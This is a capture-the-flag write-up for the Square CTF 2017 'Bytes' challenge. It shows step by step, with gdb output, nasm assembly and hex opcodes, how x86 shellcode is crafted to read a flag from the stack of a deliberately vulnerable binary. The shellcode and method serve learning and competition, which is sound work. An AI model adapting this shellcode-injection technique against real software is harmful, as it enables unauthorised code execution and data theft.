> # Bytes (50 points, Exploit)
> You can use a lot of bytes.
> 
> Our operatives found this site, which appears to control some of the androids’ infrastructure! The robots love x86 assembly; the only thing easier for them to work with is binary. 64 bytes should be enough for anyone.
> This URL is unique to your team! Don't share it with competitors!
> https://*redacted*.capturethesquare.com 

1. To get started, download the file
2. Run it: 
```
daMage@kalima:~/ctfs/squarectf2017/bytes$ ./bytes  f000
Shellcode location: 0xf770d000
Flag location: 0xffad5e50
WUNTEE_CHALLENGE_FLAG environmental variable not set. Could not read flag.
```
3. Prepare the environment:
```
daMage@kalima:~/ctfs/squarectf2017/bytes$ echo abcdefghijklmnopqrstu > flag.txt
daMage@kalima:~/ctfs/squarectf2017/bytes$ export WUNTEE_CHALLENGE_FLAG=flag.txt
```
4. Run the executable with gdb, and pass the cc's (interrupt / Int3) as the shellcode. Now is a good time to check the registers: 
```
daMage@kalima:~/ctfs/squarectf2017/bytes$ gdb -q ./bytes
Reading symbols from ./bytes...(no debugging symbols found)...done.
(gdb) r cccccc
Starting program: /home/daMage/ctfs/squarectf2017/bytes/bytes cccccc
Shellcode location: 0xf7fd1000
Flag location: *0xffffd200*

Program received signal SIGTRAP, Trace/breakpoint trap.
0xf7fd1001 in ?? ()
(gdb) info registers 
eax            0x4	4
ecx            0xffffd200	-11776
edx            0x5	5
ebx            0x1	1
esp            0xffffd1f0	*0xffffd1f0*
ebp            0xffffd298	0xffffd298
esi            0x2	2
edi            0xf7fad000	-134557696
eip            0xf7fd1001	0xf7fd1001
eflags         0x286	[ PF SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) 
```
5. Notice that the flag address is pretty close to stack pointer (just 0x10 offset).
6. Prepare simple shellcode: 
```
daMage@kalima:~/ctfs/squarectf2017/bytes$ cat test.asm 
mov edx,0x24 ; length to print, just guess now
mov ecx,esp  ; count the location from stack pointer
add ecx,0x10 ; offset was 0x10, right
mov ebx,1    ; file descriptor for stdout
mov eax,4    ; sys_write call number (for 32-bit)
int 0x80     ; Do linux syscall
mov eax,1    ; exit gracefully
int 0x80     ; fin
```
7. Compile with nasm and get the opcodes with objdump: 
```
daMage@kalima:~/ctfs/squarectf2017/bytes$ nasm  -f elf test.asm
daMage@kalima:~/ctfs/squarectf2017/bytes$ objdump -d -M intel test.o |cut -f2

test.o:     file format elf32-i386

Disassembly of section .text:
00000000 <.text>:
ba 24 00 00 00       
89 e1                
83 c1 10             
bb 01 00 00 00       
b8 04 00 00 00       
cd 80                
b8 01 00 00 00       
cd 80           
```
8. Clean up the output from objdump and try it locally:
```
daMage@kalima:~/ctfs/squarectf2017/bytes$ objdump -d -M intel test.o |cut -f2|tail -n 8 |tr -d ' \n'; echo
ba2400000089e183c110bb01000000b804000000cd80b801000000cd80
daMage@kalima:~/ctfs/squarectf2017/bytes$ ./bytes ba2400000089e183c110bb01000000b804000000cd80b801000000cd80
Shellcode location: 0xf77c1000
Flag location: 0xfff684e0
abcdefghijklmnopqrstu
daMage@kalima:~/ctfs/squarectf2017/bytes$
```
9. Finally pass the hex-encoded string to the online form and get flag:
```
Output:

Shellcode location: 0xf7765000
Flag location: 0xffd4e320
flag-nolyl-kuhyc-leduv-ryvad-mekyk


Status:

pid 82 exit 1
```
